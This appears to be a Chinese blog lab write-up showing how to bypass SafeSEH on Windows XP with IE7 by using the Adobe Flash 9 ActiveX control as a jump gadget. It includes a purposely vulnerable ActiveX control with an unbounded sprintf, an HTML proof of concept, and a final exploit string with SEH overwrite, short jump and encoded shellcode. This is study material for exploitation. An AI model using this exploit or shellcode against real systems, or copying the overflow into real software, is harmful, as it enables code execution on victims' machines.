---
layout:		post
title:		利用Adobe Flash Player ActiveX控件绕过SafeS.E.H
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 7  
>控件版本: Adobe Flash ActiveX 9.0.124  
>说明: 这篇文参考自《0Day》, 因为"利用Adobe Flash Player ActiveX控件绕过SafeS.E.H"  
这节有一些小坑, 不注意可能会实验失败, 所以写了这篇文来一步一步越过这些坑。  
<!-- more -->


### 0x00 前期准备

新建一个MFC ActiveX控件, 添加一个test方法

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x00.png)
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x01.png)

在test方法实现里添加代码

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x02.png)
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x03.png)

```
#include <string.h>
#include <windows.h>

DWORD MyException()
{
	printf("There is an exception");
	getchar();
	return 1;
}

void CVulnerAX_SEHCtrl::test(LPCTSTR str)
{
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: 在此添加调度处理程序代码
	printf("aaaa");//定位该函数的标记
	char dest[100];
	sprintf(dest,"%s",str);	
	int zero=0;
	__try
	{
	    zero=1/zero;
	}
	__except(MyException())
	{
	}
}
```

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x04.png)

如图设置好项目属性, 选择release版本, 禁用优化, 编译链接, 最后在cmd键入"Regsvr32 /path/to/activex.ocx"注册控件

```
<html>  
<body>  
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
</object>
<object classid="clsid:A15FD9CA-B0AA-4F51-9D26-B045CEEB9BA5" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 45) {
s += "\u9090";
}
test.test(s);  
</script>  
</body>  
</html>
```

新建一个txt文本, 帖入以上代码, 更名为poc.html

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x05.png)

注意这里的"clsid:A15FD9CA-B0AA-4F51-9D26-B045CEEB9BA5", 在ActiveX工程里找到


### 0x01 分析栈布局

双击poc.html自动调用IE浏览器打开, 选择允许ActiveX控件

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x06.png)
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x07.png)

来到这里, 用OllyDbg附加上去

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x08.png)

断下后选"E"找到VulnerAX_SEH.ocx, 点进去, 在printf("aaaa")下断运行

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x09.png)

断下后来到call sprintf, 跟随栈地址, 再往下一步

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0a.png)
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0b.png)

可以看到数据已经copy到栈上, 起始地址0x01dcf4e4

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0c.png)

View->SEH chain, 定位到最近的SE Handler 0x01dcf560, 0x01dcf560-0x01dcf4e4=124 byte

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0c.png)

Plugins->OllyFindAddr->Overflow return address->Find CALL/JMP [EBP+N], 选择"L", 找到0x300b2d1c这个跳板

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0d.png)

修改poc.html

```
var s = "\u9090";
while (s.length < 60) {
s += "\u9090";
}
s+="\u9090\u9090";
s+="\u2D1C\u300B";
```

再次打开, OD附加上去, 来到call sprintf再走一步, 现在SE Handler已经覆盖成跳板地址

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0e.png)

先在0x300b2d1c下断, 来到这里Shift+F9运行

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x0f.png)

断下后跟进call, 可以看到这时回到了S.E.H结构

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x10.png)
![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x11.png)


### 0x02 exploit

SE Handler的跳板地址会干扰shellcode, 将shellcode整体放到下面, 用一个短跳跳过去

```
// junk(120 byte)+jmp short(2 byte)+junk(2 byte)+board(4 byte)+junk(8 byte)+payload(114 byte)
var s = "\u9090";
while (s.length < 60) {
s += "\u9090";
}
s+="\u0EEB\u9090";		# 0xEB0E->jmp +14(相对于下一条指令地址+14 byte)
s+="\u2D1C\u300B";		# 跳板
s+="\u9090\u9090\u9090\u9090";		# junk
s+="\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50\u90d7";
test.test(s);
```

如上组织250 byte的shellcode, OD再次附加上去, 来到call sprintf往下一步

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x12.png)

F9直接运行, pwn~

![](/assets/img/exploit/2017-10-04-safeseh-break-byactivex/0x13.png)